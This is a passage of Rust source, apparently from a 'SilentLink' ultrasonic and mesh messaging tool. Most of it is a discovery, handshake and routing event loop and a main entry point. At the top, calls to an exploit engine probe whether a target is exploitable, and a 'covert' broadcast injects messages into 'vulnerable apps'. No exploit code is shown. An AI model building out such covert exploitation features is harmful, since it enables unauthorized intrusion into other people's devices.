        match self.exploit_engine.exploit_device(b"reconnaissance_probe").await {
            Ok(()) => info!("Reconnaissance successful - target is exploitable"),
            Err(e) => warn!("Reconnaissance limited: {}", e),
        }

        Ok(())
    }

    /// Emergency broadcast with maximum propagation (uses all available vectors)
    pub async fn emergency_broadcast_covert(&self, message: String) -> Result<Vec<Uuid>> {
        info!("Initiating covert emergency broadcast");
        let mut message_ids = Vec::new();

        // 1. Standard emergency broadcast
        if let Ok(id) = self.send_emergency(message.clone()).await {
            message_ids.push(id);
        }

        // 2. Vector injection to all vulnerable apps
        if let Ok(id) = self.execute_vector_injection(format!("EMERGENCY: {}", message), None).await {
            message_ids.push(id);
        }

        // 3. Ultrasonic broadcast (emergency frequencies)
        // This would use special emergency ultrasonic frequencies
        // that vector apps specifically listen for
        info!("Emergency ultrasonic broadcast active");

        if message_ids.is_empty() {
            Err(SilentLinkError::System("All emergency broadcast methods failed".to_string()))
        } else {
            info!("Emergency broadcast sent via {} vectors", message_ids.len());
            Ok(message_ids)
        }
    }
}


struct SilentLinkEventLoop {
    device_id: DeviceId,
    transport_manager: Arc<TransportManager>,
    message_router: Arc<MessageRouter>,
    is_running: Arc<AtomicBool>,
    ultrasonic_rx: mpsc::UnboundedReceiver<UltrasonicBeacon>,
    transport_device_rx: mpsc::UnboundedReceiver<DeviceId>,
    transport_message_rx: mpsc::UnboundedReceiver<EncryptedMessage>,
}

impl SilentLinkEventLoop {
    async fn run(mut self) -> Result<()> {
        info!("Starting SilentLink event loop");

        let mut cleanup_interval = interval(Duration::from_secs(60));

        while self.is_running.load(Ordering::Acquire) {
            tokio::select! {
                // Handle ultrasonic beacon discovery
                beacon = self.ultrasonic_rx.recv() => {
                    if let Some(beacon) = beacon {
                        if let Err(e) = self.handle_ultrasonic_beacon(beacon).await {
                            warn!("Error handling ultrasonic beacon: {}", e);
                        }
                    }
                }

                // Handle transport device discovery
                device_id = self.transport_device_rx.recv() => {
                    if let Some(device_id) = device_id {
                        if let Err(e) = self.handle_transport_device_discovered(device_id).await {
                            warn!("Error handling transport device discovery: {}", e);
                        }
                    }
                }

                // Handle incoming messages
                message = self.transport_message_rx.recv() => {
                    if let Some(message) = message {
                        if let Err(e) = self.handle_incoming_message(message).await {
                            warn!("Error handling incoming message: {}", e);
                        }
                    }
                }

                // Periodic cleanup
                _ = cleanup_interval.tick() => {
                    if let Err(e) = self.perform_cleanup().await {
                        warn!("Error during cleanup: {}", e);
                    }
                }
            }
        }

        info!("SilentLink event loop stopped");
        Ok(())
    }

    async fn handle_ultrasonic_beacon(&self, beacon: UltrasonicBeacon) -> Result<()> {
        info!("Received ultrasonic beacon from device: {}", beacon.device_id);

        // Validate beacon
        if beacon.device_id == self.device_id {
            return Ok(()); // Ignore our own beacon
        }

        // Check timestamp validity (within last 30 seconds)
        let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs();
        if beacon.timestamp + 30 < now {
            debug!("Ignoring old beacon from {}", beacon.device_id);
            return Ok(());
        }

        // Attempt transport connection
        if let Err(e) = self
            .transport_manager
            .connect_to_device(beacon.device_id.clone())
            .await
        {
            debug!("Could not establish transport connection to {}: {}", beacon.device_id, e);
        } else {
            info!("Established transport connection via ultrasonic discovery to {}", beacon.device_id);
            
            // Send handshake request
            let _ = self.message_router.send_message(
                "handshake_request".to_string(),
                Some(beacon.device_id),
                MessageType::HandshakeRequest,
                None,
            ).await;
        }

        Ok(())
    }

    async fn handle_transport_device_discovered(&self, device_id: DeviceId) -> Result<()> {
        info!("Discovered transport device: {}", device_id);
        
        // Attempt connection
        if let Err(e) = self
            .transport_manager
            .connect_to_device(device_id.clone())
            .await
        {
            debug!("Failed to connect to discovered device {}: {}", device_id, e);
        } else {
            info!("Connected to discovered device: {}", device_id);
        }

        Ok(())
    }

    async fn handle_incoming_message(&self, message: EncryptedMessage) -> Result<()> {
        trace!("Received message {} from {}", message.header.message_id, message.header.sender_id);
        self.message_router.route_message(message).await
    }

    async fn perform_cleanup(&self) -> Result<()> {
        debug!("Performing periodic cleanup");
        
        // Cleanup would be handled by the transport manager
        // No direct cleanup needed here since transport manager handles it
        
        Ok(())
    }
}

// Main entry point
#[tokio::main]
async fn main() -> Result<()> {
    // Check if running in CLI mode
    if std::env::args().len() > 1 {
        run_cli().await
    } else {
        // Run comprehensive demo
        examples::comprehensive_demo().await
    }
}